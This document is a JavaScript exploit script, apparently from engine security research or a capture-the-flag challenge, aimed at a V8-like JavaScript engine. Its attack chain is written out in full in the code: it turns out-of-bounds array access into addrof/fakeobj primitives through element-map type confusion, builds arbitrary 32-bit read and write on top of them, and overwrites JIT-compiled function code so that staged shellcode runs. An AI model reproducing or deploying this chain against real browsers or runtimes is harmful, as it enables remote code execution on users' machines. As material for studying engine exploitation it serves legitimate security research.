var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

// float64 => [uint32, uint32]
function ftoi(val) {
	f64_buf[0] = val;
	return [u32_buf[0], u32_buf[1]];
}

// [uint32, uint32] => float64
function itof(a, b) {
	u32_buf[0] = a;
	u32_buf[1] = b;
	return f64_buf[0];
}

function hex(n) {
	return "0x" + n.toString(16);
}

print("hello, world!");

// give friendlier names to our variables from the snapshot blob
var overflow1 = oob1[0];
var arr1      = oob1[1];
var overflow2 = oob2[0];
var arr2      = oob2[1];

// use oob reads to get pointers to <Map(FAST_DOUBLE_ELEMENTS)> and <Map(FAST_ELEMENTS)>
var fast_double_elements_map = overflow1[0x137];
var fast_elements_map = overflow2[0x139];
//%DebugPrint(fast_double_elements_map);
//%DebugPrint(fast_elements_map);


function addrof(obj) {
	// we write the data as an Element (i.e. a pointer)
	overflow1[0x137] = fast_elements_map;
	arr1[0] = obj;

	// and then cause type confusion to read it as a double, which lets us retreive the address
	overflow1[0x137] = fast_double_elements_map;
	var addr = ftoi(arr1[0])[0];
	return addr;
}

function fakeobj(addr) {
	addr |= 1; // set the low bit to mark it as a heap object

	// write as a double
	overflow1[0x137] = fast_double_elements_map;
	arr1[0] = itof(addr, addr);

	// read as an object
	overflow1[0x137] = fast_elements_map;
	var obj = arr1[0];

	// revert to doubles because this probably makes gc happier
	overflow1[0x137] = fast_double_elements_map;

	return obj;
}

var myobj = {"foo": "bar"};
print("debug:");
//%DebugPrint(myobj);

print("addrof:");
var myobj_addr = addrof(myobj);
print(hex(myobj_addr));

// test
addrof("test");

var myobj2 = fakeobj(myobj_addr);

print(JSON.stringify(myobj2));

//%CollectGarbage(true);
print("survived gc")


//                map
var floatarray = [itof(addrof(fast_double_elements_map), 8), 1.2, 1.3, 1.4];
//%DebugPrint(floatarray);

/*
0x4e2051ad <Map(FAST_DOUBLE_ELEMENTS)>
0x4e205205 <Map(FAST_ELEMENTS)>

floatarray looks like this
(gdb) x/20x 0x38189b48
0x38189b48:	0x4e2051ad	0x4dd04125	0x38189b61	0x00000008
0x38189b58:	0x31984f9d	0x2491e18d	0x31984705	0x00000008
0x38189b68:	0x9999999a	0x3ff19999	0x33333333	0x3ff33333
0x38189b78:	0xcccccccd	0x3ff4cccc	0x66666666	0x3ff66666
0x38189b88:	0x4e20e5a9	0x4dd04125	0x4dd04125	0x2491f6d1
*/

//%DebugBreak(null);

var fake = fakeobj(addrof(floatarray)+(8*4));
//print(typeof fake);
//%DebugPrint(fake);

function arbread32(addr) {
	floatarray[1] = itof((addr-8)|1, 8); // fake fixedarray
	var result = ftoi(fake[0])[0];
	floatarray[1] = itof(addrof(fast_double_elements_map), 8); // put a valid pointer back to make gc happy
	return result;
}

function arbwrite32(addr, val) {
	floatarray[1] = itof((addr-8)|1, 8); // fake fixedarray
	var second = ftoi(fake[0])[1];
	fake[0] = itof(val, second);
	floatarray[1] = itof(addrof(fast_double_elements_map), 8); // put a valid pointer back to make gc happy
}

//var buf = new ArrayBuffer(4*4);
var foo = new Uint32Array(16);
foo[0] = 0x41414141;
foo[1] = 0x42424242;
foo[2] = 0x43434343;
foo[3] = 0x44444444;
//print(hex(addrof(buf)), hex(addrof(foo)));
var backing_buf = arbread32(addrof(foo) + 4*2);

// use our existing arbread/arbwrite to corrupt an ArrayBuffer - this avoids potentially lossy float conversion
function safe_arbread32(addr) {
	var ptr_addr = backing_buf + 4*2;
	var ptr = arbread32(ptr_addr);
	arbwrite32(ptr_addr, (addr - 0x10) | 1);
	var result = foo[0];
	arbwrite32(ptr_addr, ptr); // put it back
	return result;
}

// use our existing arbread/arbwrite to corrupt an ArrayBuffer - this avoids potentially lossy float conversion
function safe_arbwrite32(addr, val) {
	var ptr_addr = backing_buf + 4*2;
	var ptr = arbread32(ptr_addr);
	arbwrite32(ptr_addr, (addr - 0x10) | 1);
	foo[0] = val;
	arbwrite32(ptr_addr, ptr); // put it back
}

function myfunc(a) {
	return (a + 0xdeadbeef) | 0;
}

// TODO: make sure func gets jitted
myfunc(5);
for (var i=0; i<100000; i++) myfunc(i);

var myfunc_addr = addrof(myfunc);
print("myfunc addr:", hex(myfunc_addr));

var function_code = safe_arbread32(myfunc_addr + 4*7);

//for (var i=0; i<20; i++) {
//	print(i, hex(safe_arbread32(myfunc_addr + i*4)));
//}

//for (var i=0; i<20; i++) {
//	//print(i, hex(safe_arbread32(function_code + i*4)));
//	print(safe_arbread32(function_code + i*4).toString(16));
//}

var big_shellcode = new Uint8Array(0x4000);

print("big_shellcode @ " + hex(addrof(big_shellcode)));

var buf_start = safe_arbread32(safe_arbread32(addrof(big_shellcode) + 4*2) + 4*3);
var buf_offset = 0x1000 - (buf_start % 0x1000);

Base64Binary.decode(stage2_shellcode_b64, big_shellcode, buf_offset);

var shellcode_ptr = buf_start + buf_offset;

print("big shellcode @ " + hex(shellcode_ptr));

//for (var i=0; i<10; i++) {
//	print(hex(safe_arbread32(shellcode_ptr + i*4)));
//}


stage1_shellcode[stage1_shellcode.length - 1] = shellcode_ptr;

//for (var i=0; i<shellcode.length; i++) {
//	safe_arbwrite32(function_code + i*4, shellcode[i]);
//}
var addr = function_code;
var ptr_addr = backing_buf + 4*2;
var ptr = arbread32(ptr_addr);
arbwrite32(ptr_addr, (addr - 0x10) | 1);
for (var i = 0; i < stage1_shellcode.length; i++) {
	foo[i] = stage1_shellcode[i];
}
arbwrite32(ptr_addr, ptr); // put it back

print("calling shellcode...");
myfunc();

//%CollectGarbage(true);
print("survived gc2");

//%DebugBreak(null);
//%DebugBreak(null);

//%DebugPrint(fakeobj(safe_arbread32(ptr + 4*1)));
